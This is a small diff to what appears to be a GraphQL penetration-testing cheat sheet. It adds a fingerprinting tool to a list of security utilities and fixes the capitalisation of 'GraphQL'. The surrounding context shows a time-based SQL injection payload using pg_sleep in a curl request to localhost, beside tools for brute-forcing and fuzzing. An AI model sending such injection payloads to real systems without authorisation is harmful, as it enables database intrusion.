@@ -38,6 +38,7 @@
 - [nicholasaleks/CrackQL](https://github.com/nicholasaleks/CrackQL) - A GraphQL password brute-force and fuzzing utility
 - [nicholasaleks/graphql-threat-matrix](https://github.com/nicholasaleks/graphql-threat-matrix) - GraphQL threat framework used by security professionals to research security gaps in GraphQL implementations
 - [dolevf/graphql-cop](https://github.com/dolevf/graphql-cop) - Security Auditor Utility for GraphQL APIs
+- [dolevf/graphw00f](https://github.com/dolevf/graphw00f) - GraphQL Server Engine Fingerprinting utility
 - [IvanGoncharov/graphql-voyager](https://github.com/IvanGoncharov/graphql-voyager) - Represent any GraphQL API as an interactive graph
 - [Insomnia](https://insomnia.rest/) - Cross-platform HTTP and GraphQL Client
 
@@ -348,7 +349,7 @@ Use `$regex` inside a `search` parameter.
 
 ### SQL Injection
 
-Send a single quote `'` inside a graphql parameter to trigger the SQL injection
+Send a single quote `'` inside a GraphQL parameter to trigger the SQL injection
 
 ```js
 { 
@@ -360,7 +361,7 @@ Send a single quote `'` inside a graphql parameter to trigger the SQL injection
 }
 ```
 
-Simple SQL injection inside a graphql field.
+Simple SQL injection inside a GraphQL field.
 
 ```powershell
 curl -X POST http://localhost:8080/graphql\?embedded_submission_form_uuid\=1%27%3BSELECT%201%3BSELECT%20pg_sleep\(30\)%3B--%27
